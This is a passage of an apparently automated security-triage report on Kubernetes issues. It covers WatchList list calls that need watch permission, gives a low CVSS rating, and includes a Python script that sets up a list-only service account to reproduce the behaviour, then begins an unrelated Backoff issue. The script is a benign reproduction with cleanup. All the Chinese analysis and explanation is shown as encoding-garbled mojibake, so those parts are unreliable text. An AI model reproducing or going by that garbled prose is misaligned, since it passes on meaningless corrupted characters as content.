7.  **å±€é™æ€§**: æ­£å¦‚è„šæœ¬æ³¨é‡Šä¸­æ‰€è¿°ï¼Œç”±äºé—®é¢˜çš„éšæœºæ€§å’Œå¯¹å†…éƒ¨ç«äº‰æ¡ä»¶çš„ä¾èµ–ï¼Œ**æ­¤è„šæœ¬ä¸èƒ½ä¿è¯ç¨³å®šå¤ç°è¯¥é—®é¢˜**ã€‚å®ƒåªæ˜¯æä¾›äº†ä¸€ä¸ªå°è¯•è§¦å‘è¯¥åœºæ™¯çš„æ¡†æ¶ã€‚å®é™…å¤ç°å¯èƒ½éœ€è¦å¤§é‡çš„ Job åˆ›å»ºæ¬¡æ•°æˆ–ç‰¹å®šçš„é›†ç¾¤è´Ÿè½½æ¡ä»¶ã€‚
8.  **æ‰§è¡Œ**: è„šæœ¬æœ€åç›´æ¥è°ƒç”¨ `main()` å‡½æ•°ï¼ˆåœ¨å®é™…ç¯å¢ƒä¸­éœ€è¦å–æ¶ˆæ³¨é‡Šæˆ–æŒ‰éœ€è°ƒç”¨ï¼‰ï¼ŒåŒ…å«äº†é”™è¯¯å¤„ç†å’Œæ¸…ç†é€»è¾‘ã€‚

**æ³¨æ„**: è¿è¡Œæ­¤è„šæœ¬éœ€è¦åœ¨å…·æœ‰ Kubernetes é›†ç¾¤è®¿é—®æƒé™ï¼ˆåˆ›å»º Jobã€æŸ¥çœ‹ Podã€åˆ é™¤ Jobï¼‰çš„ç¯å¢ƒä¸­æ‰§è¡Œã€‚è¯·ç¡®ä¿æµ‹è¯•å‘½åç©ºé—´ (`NAMESPACE`) æ˜¯åˆé€‚çš„ï¼Œé¿å…å½±å“ç”Ÿäº§ç¯å¢ƒã€‚

---


## Issue #130619 List calls in a k8s 1.34 client will make additional api requests and log a warning w/o watch perms

- Issue é“¾æ¥ï¼š[#130619](https://github.com/kubernetes/kubernetes/issues/130619)

### Issue å†…å®¹

#### What happened?

The WatchList feature is slated to be default-on in k8s 1.34: https://github.com/kubernetes-sigs/controller-runtime/pull/3136#discussion_r1982992848

Due to how it is implemented, this feature requires watch permissions to perform list calls. If that permission doesn't exist, an [api call that is guaranteed to fail](https://github.com/kubernetes/kubernetes/blob/e319c541f144e9bee6160f1dd8671638a9029f4c/staging/src/k8s.io/client-go/gentype/type.go#L178) will be made and [a warning will be logged](https://github.com/kubernetes/kubernetes/blob/e319c541f144e9bee6160f1dd8671638a9029f4c/staging/src/k8s.io/client-go/gentype/type.go#L178).

As a user, it is extremely surprising and unexpected that a LIST call would require watch permissions. In many cases, the users of projects that internally use client-go will be lead into thinking that there is a misconfiguration, which is not the case. 

This feature also completely defeats the purpose of having separate LIST and WATCH permissions in the first place.

#### What did you expect to happen?

One or more of:
* This never being on by default in the clients for LIST operations and always requiring explicit opt in
* List calls using WatchList not require watch permissions

#### How can we reproduce it (as minimally and precisely as possible)?

/

#### Anything else we need to know?

/

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† Kubernetes client-go åº“åœ¨ 1.34 ç‰ˆæœ¬ä¸­ï¼Œç”±äº `WatchList` åŠŸèƒ½é»˜è®¤å¼€å¯ï¼Œå¯¼è‡´æ‰§è¡Œ `List` æ“ä½œæ—¶ï¼Œå³ä½¿è°ƒç”¨è€…åªæœ‰ `List` æƒé™è€Œæ²¡æœ‰ `Watch` æƒé™ï¼Œä¹Ÿä¼šé¢å¤–å°è¯•å‘èµ·ä¸€ä¸ªéœ€è¦ `Watch` æƒé™çš„ API è°ƒç”¨ã€‚è¿™ä¸ªé¢å¤–çš„è°ƒç”¨é¢„æœŸä¼šå¤±è´¥ï¼ˆå› ä¸ºå®ƒéœ€è¦ `Watch` æƒé™ï¼‰ï¼Œå¹¶ä¸”ä¼šè®°å½•ä¸€æ¡è­¦å‘Šæ—¥å¿—ã€‚

æ ¸å¿ƒé—®é¢˜ç‚¹ï¼š
1.  **è¡Œä¸ºå˜æ›´ä¸ç”¨æˆ·é¢„æœŸä¸ç¬¦**ï¼šç”¨æˆ·é€šå¸¸é¢„æœŸ `List` æ“ä½œåªéœ€è¦ `List` æƒé™ã€‚æ–°è¡Œä¸ºéœ€è¦ `Watch` æƒé™æ‰èƒ½æœ€é«˜æ•ˆæ‰§è¡Œï¼ˆé¿å…è­¦å‘Šå’Œå¤±è´¥çš„ API è°ƒç”¨ï¼‰ï¼Œè¿™è¿åäº†ç”¨æˆ·çš„ç›´è§‰å’Œæœ€å°æƒé™åŸåˆ™çš„é¢„æœŸã€‚
2.  **äº§ç”Ÿé¢å¤– API è°ƒç”¨å’Œæ—¥å¿—**ï¼šå³ä½¿ `List` æ“ä½œæœ€ç»ˆæˆåŠŸï¼ˆåœ¨ `Watch` å°è¯•å¤±è´¥åå›é€€åˆ°æ™®é€š Listï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¹Ÿä¼šäº§ç”Ÿä¸€ä¸ªå¤±è´¥çš„ API è¯·æ±‚å’Œä¸€æ¡è­¦å‘Šæ—¥å¿—ã€‚è¿™ä¼šå¢åŠ  API Server çš„è´Ÿè½½ï¼ˆå°½ç®¡å•ä¸ªè¯·æ±‚å½±å“å¾ˆå°ï¼‰ï¼Œå¹¶å¯èƒ½äº§ç”Ÿä¸å¿…è¦çš„æ—¥å¿—å™ªéŸ³ï¼Œå¹²æ‰°ç›‘æ§å’Œè°ƒè¯•ã€‚
3.  **æƒé™è®¾è®¡çš„æ··æ·†**ï¼šå¦‚ Issue ä¸­æ‰€è¿°ï¼Œè¿™åœ¨æŸç§ç¨‹åº¦ä¸Šæ¨¡ç³Šäº† `List` å’Œ `Watch` æƒé™çš„ç•Œé™ï¼Œè‡³å°‘åœ¨ä½¿ç”¨ `WatchList` åŠŸèƒ½æ—¶æ˜¯è¿™æ ·ã€‚

å®‰å…¨é£é™©åˆ†æï¼š
1.  **æƒé™æå‡ï¼Ÿ**ï¼šå¦ã€‚è¯¥è¡Œä¸º*ä¸ä¼š*æˆäºˆè°ƒç”¨è€…å…¶ä¸å…·å¤‡çš„ `Watch` æƒé™ã€‚ç›¸åï¼Œæ­£æ˜¯å› ä¸º*ç¼ºä¹* `Watch` æƒé™æ‰è§¦å‘äº†å¤±è´¥çš„è°ƒç”¨å’Œè­¦å‘Šã€‚RBAC ä»ç„¶åœ¨å¼ºåˆ¶æ‰§è¡Œã€‚
2.  **ä¿¡æ¯æ³„éœ²ï¼Ÿ**ï¼šå¦ã€‚Issue ä¸­æåˆ°ä¼šè®°å½•è­¦å‘Šï¼Œä½†æ²¡æœ‰ä¿¡æ¯è¡¨æ˜ä¼šæ³„éœ²æ•æ„Ÿæ•°æ®æˆ–å‡­æ®ã€‚å¤±è´¥çš„ API è°ƒç”¨æ˜¯è®¾è®¡ç”¨æ¥æ£€æŸ¥æƒé™çš„ï¼Œè€Œéæ³„éœ²ä¿¡æ¯ã€‚
3.  **æ‹’ç»æœåŠ¡ (DoS)ï¼Ÿ**ï¼šæ½œåœ¨çš„ä½é£é™©ã€‚å¤§é‡çš„å®¢æˆ·ç«¯ï¼ˆåªæœ‰ `List` æƒé™ï¼‰é¢‘ç¹æ‰§è¡Œ `List` æ“ä½œå¯èƒ½ä¼šå› ä¸ºè¿™äº›é¢å¤–çš„ã€æ³¨å®šå¤±è´¥çš„ API è°ƒç”¨è€Œè½»å¾®å¢åŠ  API Server çš„è´Ÿè½½ã€‚ç„¶è€Œï¼Œè¿™éœ€è¦å¤§é‡å¹¶å‘æ“ä½œæ‰å¯èƒ½æ„æˆæ˜¾è‘—å½±å“ï¼Œå¹¶ä¸”æ”»å‡»è€…éœ€è¦å…·å¤‡åˆæ³•çš„ `List` æƒé™æ‰èƒ½è§¦å‘ã€‚æ ¹æ®æ ‡å‡† 5ï¼Œéœ€è¦æƒé™ï¼ˆå³ä½¿æ˜¯åªè¯»æƒé™ `List`ï¼‰æ‰èƒ½è§¦å‘çš„ DoS åº”è€ƒè™‘é™çº§ï¼Œä¸”æ­¤å¤„çš„æ½œåœ¨å½±å“è¾ƒå°ï¼Œæ›´åƒæ˜¯æ€§èƒ½æŸè€—å’Œæ—¥å¿—å™ªéŸ³ï¼Œè€Œéå…¸å‹çš„ DoS æ”»å‡»ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ/å®¹å™¨é€ƒé€¸/ææƒï¼Ÿ**ï¼šå¦ã€‚æ­¤é—®é¢˜ä¸è¿™äº›é«˜é£é™©ç±»å‹æ— å…³ã€‚
5.  **å½±å“å…¶ä»–ç”¨æˆ·ï¼Ÿ**ï¼šå¦ã€‚æ­¤é—®é¢˜å½±å“çš„æ˜¯æ‰§è¡Œ `List` æ“ä½œçš„å®¢æˆ·ç«¯æœ¬èº«ï¼ŒåŸºäºå…¶è‡ªèº«çš„æƒé™ã€‚

ç»“è®ºï¼šè¯¥ Issue ä¸»è¦æè¿°äº†ä¸€ä¸ªåŠŸèƒ½è®¾è®¡é—®é¢˜æˆ–ç”¨æˆ·ä½“éªŒé—®é¢˜ï¼Œå®ƒè¿åäº†ç”¨æˆ·å¯¹ Kubernetes RBAC æƒé™åˆ†ç¦»çš„é¢„æœŸï¼Œå¹¶å¯èƒ½å¯¼è‡´é¢å¤–çš„ API è´Ÿè½½å’Œæ—¥å¿—å™ªéŸ³ã€‚è™½ç„¶å­˜åœ¨è½»å¾®çš„å¢åŠ  API è´Ÿè½½çš„å¯èƒ½æ€§ï¼Œä½†å®ƒä¸æ„æˆä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ææƒã€ä¿¡æ¯æ³„éœ²æˆ–é«˜å± DoS æ¼æ´ã€‚å…¶ä¸»è¦å½±å“æ˜¯æ“ä½œå±‚é¢çš„å›°æƒ‘å’Œæ½œåœ¨çš„æ€§èƒ½/æ—¥å¿—å™ªéŸ³ã€‚

æ ¹æ® CVSS 3.1 è¯„ä¼°ï¼š
*   Attack Vector (AV): Network (N) - K8s API æ˜¯ç½‘ç»œæœåŠ¡ã€‚
*   Attack Complexity (AC): Low (L) - åªéœ€æ‰§è¡Œæ ‡å‡†çš„ List æ“ä½œã€‚
*   Privileges Required (PR): Low (L) - éœ€è¦æœ‰æ•ˆçš„ K8s å‡­è¯ï¼Œå¹¶è¢«æˆäºˆç›¸å…³èµ„æºçš„ `List` æƒé™ã€‚
*   User Interaction (UI): None (N) - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   Scope (S): Unchanged (U) - å½±å“èŒƒå›´é™äº API Server å’Œå®¢æˆ·ç«¯æœ¬èº«ã€‚
*   Confidentiality (C): None (N) - ä¸æ¶‰åŠæœºå¯†æ€§æ³„éœ²ã€‚
*   Integrity (I): None (N) - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
*   Availability (A): Low (L) - å¯èƒ½å¯¼è‡´è½»å¾®çš„ API Server è´Ÿè½½å¢åŠ å’Œæ—¥å¿—å¢å¤šã€‚

CVSS 3.1 Base Score: 3.3 (Low)

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
from kubernetes import client, config
import time
import signal
import os
import sys
import threading

# Timeout configuration (seconds)
TIMEOUT_SECONDS = 120

# Define a timeout handler
class TimeoutError(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutError(f"Script execution timed out after {TIMEOUT_SECONDS} seconds.")

def setup_kubernetes_client():
    """Loads Kubernetes configuration and returns API clients."""
    try:
        config.load_kube_config()  # Load from default location (~/.kube/config)
        print("Successfully loaded kubeconfig.")
        core_v1_api = client.CoreV1Api()
        rbac_v1_api = client.RbacAuthorizationV1Api()
        return core_v1_api, rbac_v1_api
    except Exception as e:
        print(f"Error loading Kubernetes configuration: {e}", file=sys.stderr)
        sys.exit(1)

def cleanup_resources(core_v1_api, rbac_v1_api, namespace, sa_name, role_name, binding_name):
    """Cleans up created Kubernetes resources."""
    print("\n--- Starting Cleanup ---")
    try:
        print(f"Deleting RoleBinding: {binding_name} in namespace: {namespace}")
        rbac_v1_api.delete_namespaced_role_binding(binding_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting RoleBinding {binding_name}: {e}", file=sys.stderr)
        else:
            print(f"RoleBinding {binding_name} not found, likely already deleted.")
    except Exception as e:
         print(f"Unexpected error deleting RoleBinding {binding_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting Role: {role_name} in namespace: {namespace}")
        rbac_v1_api.delete_namespaced_role(role_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting Role {role_name}: {e}", file=sys.stderr)
        else:
            print(f"Role {role_name} not found, likely already deleted.")
    except Exception as e:
            print(f"Unexpected error deleting Role {role_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting ServiceAccount: {sa_name} in namespace: {namespace}")
        core_v1_api.delete_namespaced_service_account(sa_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting ServiceAccount {sa_name}: {e}", file=sys.stderr)
        else:
            print(f"ServiceAccount {sa_name} not found, likely already deleted.")
    except Exception as e:
        print(f"Unexpected error deleting ServiceAccount {sa_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting Namespace: {namespace}")
        core_v1_api.delete_namespace(namespace)
        # Wait a bit for namespace deletion to be accepted
        time.sleep(5)
        print("Namespace deletion request sent.")
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting Namespace {namespace}: {e}", file=sys.stderr)
        else:
            print(f"Namespace {namespace} not found, likely already deleted.")
    except Exception as e:
        print(f"Unexpected error deleting Namespace {namespace}: {e}", file=sys.stderr)

    print("--- Cleanup Finished ---")


def main():
    # Setup timeout alarm
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(TIMEOUT_SECONDS)

    core_v1_api, rbac_v1_api = setup_kubernetes_client()

    namespace = "issue-watchlist-poc-ns"
    sa_name = "list-only-sa"
    role_name = "pod-lister-role"
    binding_name = "pod-lister-binding"

    try:
        # 1. Create Namespace
        try:
            print(f"Creating namespace: {namespace}")
            core_v1_api.create_namespace(client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace)))
            print(f"Namespace '{namespace}' created.")
        except client.ApiException as e:
            if e.status == 409:  # Already exists
                print(f"Namespace '{namespace}' already exists.")
            else:
                raise

        # 2. Create ServiceAccount
        try:
            print(f"Creating ServiceAccount: {sa_name} in namespace: {namespace}")
            sa = client.V1ServiceAccount(metadata=client.V1ObjectMeta(name=sa_name))
            core_v1_api.create_namespaced_service_account(namespace, sa)
            print(f"ServiceAccount '{sa_name}' created.")
             # Wait a bit for service account to be fully available for token generation
            time.sleep(2)
        except client.ApiException as e:
            if e.status == 409:  # Already exists
                print(f"ServiceAccount '{sa_name}' already exists.")
                time.sleep(2) # Still wait if it exists
            else:
                raise

        # 3. Create Role (List pods only, NO Watch)
        print(f"Creating Role: {role_name} in namespace: {namespace}")
        role = client.V1Role(
            metadata=client.V1ObjectMeta(name=role_name, namespace=namespace),
            rules=[
                client.V1PolicyRule(
                    api_groups=[""],  # Core API group
                    resources=["pods"],
                    verbs=["list"]    # <<<< ONLY LIST PERMISSION
                )
            ]
        )
        try:
             rbac_v1_api.create_namespaced_role(namespace, role)
             print(f"Role '{role_name}' created.")
        except client.ApiException as e:
             if e.status == 409: # Already exists
                 print(f"Role '{role_name}' already exists. Replacing...")
                 try:
                     rbac_v1_api.replace_namespaced_role(role_name, namespace, role)
                     print(f"Role '{role_name}' replaced.")
                 except client.ApiException as replace_e:
                     print(f"Failed to replace Role '{role_name}': {replace_e}", file=sys.stderr)
                     raise replace_e from None
             else:
                 print(f"Failed to create Role '{role_name}': {e}", file=sys.stderr)
                 raise


        # 4. Create RoleBinding
        print(f"Creating RoleBinding: {binding_name} in namespace: {namespace}")
        binding = client.V1RoleBinding(
            metadata=client.V1ObjectMeta(name=binding_name, namespace=namespace),
            subjects=[client.V1Subject(kind="ServiceAccount", name=sa_name, namespace=namespace)],
            role_ref=client.V1RoleRef(kind="Role", name=role_name, api_group="rbac.authorization.k8s.io")
        )
        try:
            rbac_v1_api.create_namespaced_role_binding(namespace, binding)
            print(f"RoleBinding '{binding_name}' created.")
        except client.ApiException as e:
             if e.status == 409: # Already exists
                 print(f"RoleBinding '{binding_name}' already exists. Replacing...")
                 try:
                     rbac_v1_api.replace_namespaced_role_binding(binding_name, namespace, binding)
                     print(f"RoleBinding '{binding_name}' replaced.")
                 except client.ApiException as replace_e:
                     print(f"Failed to replace RoleBinding '{binding_name}': {replace_e}", file=sys.stderr)
                     raise replace_e from None
             else:
                 print(f"Failed to create RoleBinding '{binding_name}': {e}", file=sys.stderr)
                 raise

        # 5. Get ServiceAccount Token (using TokenRequest API)
        print(f"Requesting token for ServiceAccount: {sa_name}")
        token_request = client.V1TokenRequest(
             spec=client.V1TokenRequestSpec(
                 audiences=["api"], # Or adjust audience as needed
                 # expiration_seconds=3600 # Optional: request specific duration
             )
        )
        try:
            token_response = core_v1_api.create_namespaced_service_account_token(sa_name, namespace, token_request)
            sa_token = token_response.status.token
            print("Successfully obtained token for ServiceAccount.")
        except client.ApiException as e:
             print(f"Error creating token for ServiceAccount {sa_name}: {e}", file=sys.stderr)
             print("Please ensure your Kubernetes version supports the TokenRequest API (v1.21+) and the feature gate is enabled if necessary, or that the SA exists.", file=sys.stderr)
             # Attempt older secret-based method as fallback (less secure, may be disabled)
             print("Attempting fallback to find Secret-based token...")
             try:
                 time.sleep(5) # Secrets might take time to be generated
                 secrets = core_v1_api.list_namespaced_secret(namespace, field_selector=f"type=kubernetes.io/service-account-token")
                 sa_secret_name = None
                 for secret in secrets.items:
                     if secret.metadata.annotations and secret.metadata.annotations.get("kubernetes.io/service-account.name") == sa_name:
                         sa_secret_name = secret.metadata.name
                         break
                 if not sa_secret_name:
                     raise ValueError(f"Could not find Secret token for ServiceAccount {sa_name}")

                 secret_data = core_v1_api.read_namespaced_secret(sa_secret_name, namespace)
                 import base64
                 sa_token = base64.b64decode(secret_data.data['token']).decode('utf-8')
                 print("Successfully obtained token via Secret.")

             except Exception as secret_e:
                 print(f"Fallback to Secret-based token failed: {secret_e}", file=sys.stderr)
                 raise e from secret_e # Re-raise original TokenRequest error


        # 6. Configure a new API client using the ServiceAccount token
        print("Configuring new client with ServiceAccount token...")
        restricted_configuration = client.Configuration()
        # Important: Copy host and SSL settings from the original config
        original_config = client.Configuration.get_default_copy()
        restricted_configuration.host = original_config.host
        restricted_configuration.ssl_ca_cert = original_config.ssl_ca_cert
        restricted_configuration.cert_file = original_config.cert_file
        restricted_configuration.key_file = original_config.key_file
        restricted_configuration.verify_ssl = original_config.verify_ssl
        # Set the token
        restricted_configuration.api_key['authorization'] = sa_token
        restricted_configuration.api_key_prefix['authorization'] = 'Bearer'

        restricted_core_v1_api = client.CoreV1Api(client.ApiClient(restricted_configuration))

        # 7. Perform the List operation using the restricted client
        print(f"\nAttempting to list pods in namespace '{namespace}' using ServiceAccount '{sa_name}' (which only has 'list' permission)...")
        try:
            pod_list = restricted_core_v1_api.list_namespaced_pod(namespace)
            print(f"SUCCESS: List operation completed. Found {len(pod_list.items)} pods.")
            print("----> Verification <----")
            print("Check the Kubernetes API Server logs around the time of this script execution.")
            print(f"If the client-go library used by the API server or controllers internally corresponds to a version affected by the issue (e.g., using controller-runtime with WatchList default-on, around k8s 1.34+ context),")
            print(f"you *might* observe a failed API request (attempting a watch-like operation for pods by service account '{sa_name}' in namespace '{namespace}')")
            print(f"and/or a warning log related to missing 'watch' permission, even though the 'list' operation succeeded.")
            print("The exact logging behavior depends on server configuration and client-go version.")
            print("This script demonstrates that the list operation *works* with only 'list' permission, setting the stage for the described issue.")
            print("------------------------")

        except client.ApiException as e:
            print(f"ERROR: Failed to list pods using the restricted ServiceAccount: {e}", file=sys.stderr)
            print("This should NOT happen if RBAC is set up correctly, as the SA has 'list' permission.", file=sys.stderr)
        except Exception as e:
            print(f"An unexpected error occurred during the list operation: {e}", file=sys.stderr)

    except TimeoutError as e:
        print(f"\nError: {e}", file=sys.stderr)
    except client.ApiException as e:
        print(f"\nAn Kubernetes API error occurred: {e.status} {e.reason} - {e.body}", file=sys.stderr)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}", file=sys.stderr)
    finally:
        # Cleanup resources
        cleanup_resources(core_v1_api, rbac_v1_api, namespace, sa_name, role_name, binding_name)
        # Disable the alarm
        signal.alarm(0)

# Execute the main function directly
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨æ¨¡æ‹Ÿ Issue ä¸­æè¿°çš„åœºæ™¯ï¼šä¸€ä¸ª Kubernetes å®¢æˆ·ç«¯ï¼ˆç”±è„šæœ¬æ¨¡æ‹Ÿçš„æœåŠ¡è´¦å·ä»£è¡¨ï¼‰åªæœ‰ `list` æƒé™ï¼Œæ²¡æœ‰ `watch` æƒé™ï¼Œç„¶åå°è¯•æ‰§è¡Œ `list` æ“ä½œã€‚
2.  **ç¯å¢ƒè®¾ç½®**:
    *   è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„ `kubeconfig` æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº `~/.kube/config`ï¼‰æ¥è¿æ¥åˆ° Kubernetes é›†ç¾¤ã€‚
    *   å®ƒåˆ›å»ºä¸€ä¸ªæ–°çš„å‘½åç©ºé—´ (`issue-watchlist-poc-ns`) ä»¥éš”ç¦»èµ„æºã€‚
    *   åœ¨å‘½åç©ºé—´å†…ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªæœåŠ¡è´¦å· (`list-only-sa`)ã€‚
    *   æ¥ç€ï¼Œåˆ›å»ºä¸€ä¸ªè§’è‰² (`pod-lister-role`)ï¼Œè¯¥è§’è‰²**ä»…åŒ…å«å¯¹ `pods` èµ„æºçš„ `list` æƒé™**ï¼Œæ˜ç¡®æ’é™¤äº† `watch` æƒé™ã€‚
    *   ç„¶åï¼Œåˆ›å»ºä¸€ä¸ªè§’è‰²ç»‘å®š (`pod-lister-binding`)ï¼Œå°†ä¸Šè¿°è§’è‰²æˆäºˆæœåŠ¡è´¦å·ã€‚
3.  **æ¨¡æ‹Ÿå—é™å®¢æˆ·ç«¯**:
    *   è„šæœ¬è·å–åˆšåˆ›å»ºçš„æœåŠ¡è´¦å·çš„è®¤è¯ä»¤ç‰Œ (Token)ã€‚å®ƒä¼˜å…ˆå°è¯•ä½¿ç”¨è¾ƒæ–°çš„ `TokenRequest` APIï¼Œå¦‚æœå¤±è´¥ï¼ˆä¾‹å¦‚åœ¨è¾ƒæ—§çš„ K8s ç‰ˆæœ¬ä¸Šï¼‰ï¼Œåˆ™å›é€€å°è¯•æŸ¥æ‰¾å…³è”çš„ Secret æ¥è·å–ä»¤ç‰Œã€‚
    *   å®ƒä½¿ç”¨è·å–åˆ°çš„ä»¤ç‰Œåˆ›å»ºä¸€ä¸ªæ–°çš„ Kubernetes API å®¢æˆ·ç«¯é…ç½®ã€‚è¿™ä¸ªæ–°çš„å®¢æˆ·ç«¯å°†ä»¥æœåŠ¡è´¦å·çš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œå› æ­¤åªæ‹¥æœ‰ `list` æƒé™ã€‚
4.  **æ‰§è¡Œ List æ“ä½œ**:
    *   è„šæœ¬ä½¿ç”¨è¿™ä¸ªå—é™åˆ¶çš„å®¢æˆ·ç«¯æ¥æ‰§è¡Œ `list_namespaced_pod` æ“ä½œï¼Œå°è¯•åˆ—å‡ºæŒ‡å®šå‘½åç©ºé—´ä¸­çš„ Podã€‚
5.  **éªŒè¯ä¸è¯´æ˜**:
    *   è„šæœ¬é¢„æœŸ `list_namespaced_pod` æ“ä½œä¼š**æˆåŠŸ**æ‰§è¡Œï¼Œå› ä¸ºæœåŠ¡è´¦å·ç¡®å®æ‹¥æœ‰ `list` æƒé™ã€‚è„šæœ¬ä¼šæ‰“å°æˆåŠŸæ¶ˆæ¯ã€‚
    *   **å…³é”®ç‚¹**ï¼šè„šæœ¬æœ¬èº«*æ— æ³•*ç›´æ¥éªŒè¯ Issue ä¸­æåˆ°çš„ "é¢å¤–çš„ API è¯·æ±‚" å’Œ "è­¦å‘Šæ—¥å¿—"ã€‚è¿™äº›ç°è±¡å‘ç”Ÿåœ¨ Kubernetes API Server ç«¯æˆ–è€… client-go åº“å†…éƒ¨çš„æ—¥å¿—ä¸­ã€‚
    *   å› æ­¤ï¼Œè„šæœ¬åœ¨æˆåŠŸåˆ—å‡º Pod åä¼šæ‰“å°æç¤ºä¿¡æ¯ï¼ŒæŒ‡å¯¼ç”¨æˆ·å»æ£€æŸ¥ Kubernetes API Server çš„æ—¥å¿—ã€‚å¦‚æœé›†ç¾¤è¿è¡Œçš„ Kubernetes ç‰ˆæœ¬å’Œ client-go åº“ç‰ˆæœ¬ç¬¦åˆ Issue ä¸­æè¿°çš„æƒ…å†µï¼ˆä¾‹å¦‚ K8s 1.34+ ç›¸å…³çš„ client-goï¼‰ï¼Œç”¨æˆ·åº”è¯¥èƒ½åœ¨æ—¥å¿—ä¸­è§‚å¯Ÿåˆ°ï¼Œåœ¨ `list` æ“ä½œæˆåŠŸçš„åŒæ—¶ï¼Œå¯èƒ½ä¼´éšç€ä¸€ä¸ªæ¥è‡ª `list-only-sa` æœåŠ¡è´¦å·çš„ã€å› ç¼ºå°‘ `watch` æƒé™è€Œå¤±è´¥çš„ API è°ƒç”¨è®°å½•ï¼Œæˆ–è€…ç›¸å…³çš„è­¦å‘Šæ—¥å¿—ã€‚
6.  **èµ„æºæ¸…ç†**:
    *   æ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œ`finally` å—ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ‰€æœ‰èµ„æºï¼ˆRoleBinding, Role, ServiceAccount, Namespaceï¼‰ï¼Œä»¥ä¿æŒé›†ç¾¤æ•´æ´ã€‚
7.  **è¶…æ—¶æœºåˆ¶**:
    *   è„šæœ¬åŒ…å«ä¸€ä¸ª 120 ç§’çš„è¶…æ—¶æœºåˆ¶ï¼Œé˜²æ­¢å› é›†ç¾¤é—®é¢˜æˆ–æƒé™é—®é¢˜å¯¼è‡´è„šæœ¬æ— é™æœŸæŒ‚èµ·ã€‚

**å¦‚ä½•ç¡®è®¤é—®é¢˜å¤ç°**: è¿è¡Œæ­¤è„šæœ¬åï¼Œéœ€è¦æ‰‹åŠ¨æ£€æŸ¥ Kubernetes API Server çš„å®¡è®¡æ—¥å¿—æˆ–æ™®é€šæ—¥å¿—ï¼ˆå…·ä½“å–å†³äºæ—¥å¿—çº§åˆ«å’Œé…ç½®ï¼‰ï¼ŒæŸ¥æ‰¾åœ¨è„šæœ¬æ‰§è¡Œæ—¶é—´ç‚¹é™„è¿‘ï¼Œæºè‡ª `system:serviceaccount:issue-watchlist-poc-ns:list-only-sa` çš„é’ˆå¯¹ `pods` èµ„æºçš„ã€çŠ¶æ€ä¸ºå¤±è´¥ï¼ˆä¾‹å¦‚ 403 Forbiddenï¼‰ä¸”æ¶‰åŠ `watch` åŠ¨è¯ï¼ˆæˆ–ä¸ WatchList ç›¸å…³çš„å†…éƒ¨æ“ä½œï¼‰çš„ API è¯·æ±‚è®°å½•ã€‚åŒæ—¶ï¼Œ`list pods` çš„è¯·æ±‚åº”è¯¥æ˜¯æˆåŠŸçš„ï¼ˆçŠ¶æ€ç  200ï¼‰ã€‚å¦‚æœè§‚å¯Ÿåˆ°è¿™ç§æ¨¡å¼ï¼Œå³æˆåŠŸçš„ `list` æ“ä½œä¼´éšç€å¤±è´¥çš„ `watch` ç›¸å…³å°è¯•å’Œå¯èƒ½çš„è­¦å‘Šï¼Œåˆ™è¯´æ˜ Issue ä¸­æè¿°çš„ç°è±¡å¾—ä»¥å¤ç°ã€‚

---


# âœ… ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (39 ä¸ª)

## Issue #131122 Is it necessary to keep the Duration at the Cap value

- Issue é“¾æ¥ï¼š[#131122](https://github.com/kubernetes/kubernetes/issues/131122)

### Issue å†…å®¹

#### What happened?

I'm encountering a scenario where a check operation needs to be executed at intervals of `1s, 2s, 4s... (doubling each time) up to a cap of 1 minute`. After reaching the 1-minute cap, the check operation should persistently run every 1 minute. So I try to implement it with following code
```go
backoff: &Backoff{
		Duration: time.Second,
		Factor:   2,
		Steps: math.MaxInt32,
		Cap:   time.Minute,
	}
```
But the current `wait.BackOff` implementation fails to achieve this behavior because once the `Cap` is reached, it immediately sets the `Step` field value to zero, thereby terminating the looped check operation. Therefore, is it necessary to add an option to ensure the `Duration` remains at the `Cap` value after reaching it?

/sig api-machinery

#### What did you expect to happen?

check operation needs to be executed at intervals of `1s, 2s, 4s... (doubling each time) up to a cap of 1 minute`. After reaching the 1-minute cap, the check operation should persistently run every 1 minute

#### How can we reproduce it (as minimally and precisely as possible)?

```go
backoff := &Backoff{
		Duration: time.Second,
		Factor:   2,
		Steps: math.MaxInt32,
		Cap:   time.Minute,
}
wait.ExponentialBackoff(backoff, func() (done bool, err error) {
		...
})
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
